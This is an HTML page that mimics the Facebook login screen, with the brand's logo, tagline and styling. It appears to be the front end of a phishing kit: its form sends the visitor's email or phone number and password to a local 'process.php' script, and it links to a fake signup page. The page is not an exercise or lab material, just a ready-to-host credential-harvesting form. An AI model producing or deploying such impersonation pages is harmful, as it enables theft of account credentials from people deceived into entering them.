<!DOCTYPE html>
<html>
<head>
  <title>Login with facebook</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <style>
    body {
        padding: 0;
        margin: 0;
        background: #f0f2f5;
        font-family: Arial, sans-serif;
    }
    .box {
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100%;
        height: 100vh;
    }
    .title-box {
        width: 100%;
        max-width: 500px;
        margin: auto;
        text-align: center;
    }
    .title-box img {
        width: 235px;
        margin-bottom: -10px;
    }
    .title-box p {
        color: #000;
        font-size: 26px;
        font-weight: normal;
        line-height: 32px;
    }
    .form-box {
        width: 100%;
        max-width: 350px;
        margin: auto;
        padding: 15px;
        text-align: center;
        border-radius: 5px;
        background: #fff;
        box-shadow: 0px 2px 10px 1px rgba(71, 71, 71, 0.52);
    }
    .form-box input {
        width: 100%;
        margin-bottom: 15px;
        padding: 15px;
        font-size: 18px;
        box-sizing: border-box;
        border: 1px solid #eeebeb;
        border-radius: 5px;
        outline: none;
    }
    .form-box input:focus {
        box-shadow: 0px 0px 1px 1px rgb(22, 111, 229);
    }
    .form-box button {
        width: 100%;
        margin-bottom: 15px;
        color: #fff;
        font-size: 20px;
        font-weight: 600;
        border-radius: 5px;
        border: none;
        padding: 13px 0;
        cursor: pointer;
        background: #166fe5;
    }
    .form-box button:hover {
        background: #1877f2;
    }
    .form-box a {
        color: #166fe5;
        font-size: 14px;
        text-decoration: none;
        margin-top: 5px;
        margin-bottom: 20px;
        display: block;
    }
    .form-box a:hover {
        text-decoration: underline;
    }
    .form-box hr {
        border: 1px solid #dadde1;
        margin-bottom: 15px;
    }
    .form-box .create-btn a {
        color: #fff;
        font-size: 16px;
        text-decoration: none;
        padding: 15px 20px;
        border-radius: 5px;
        background: #36a240;
        font-weight: 600;
        display: inline-block;
        margin-bottom: 5px;
    }
  </style>
</head>
<body>
    <div class="container-fluid" style="text-align: center;">
        <br>
        <div class="title-box">
          <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
          <br><br>
          <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="form-box">
          <form method="post" action="process.php">
            <input type="text" placeholder="Email address or phone number" name="email_number" required>
            <input type="password" placeholder="Password" name="password" required>
            <a href="couple query.html"><button type="submit">Log In</button></a>
            <a href="">Forgotten Password</a>
          </form>
          <hr>
          <div class="create-btn">
            <a href="facebook.signup.html" target="_blank">Create New Account</a>
          </div>
        </div>
      </div>
</body>
</html>
